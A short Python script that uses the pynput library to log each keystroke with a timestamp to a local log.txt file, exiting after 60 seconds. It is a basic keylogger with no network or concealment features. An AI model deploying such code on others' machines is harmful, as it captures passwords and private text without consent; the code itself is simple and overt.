import sys
import os
import pynput
import datetime

start_time = datetime.datetime.now()
script_dir = sys.path[0]


def get_how_long_running():
    dt = datetime.datetime.now() - start_time
    return dt.total_seconds()


log_file = os.path.join(script_dir, 'log.txt')
max_duration = 60


def on_press(key):
    out = ''
    try:
        out += key.char
    except AttributeError:
        out += '{0}'.format(key)
    out += ' '
    out += str(datetime.datetime.now())
    out += '\n'
    with open(log_file, 'a') as f:
        f.write(out)
        print(get_how_long_running())
    if get_how_long_running() > max_duration:
        sys.exit()


with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
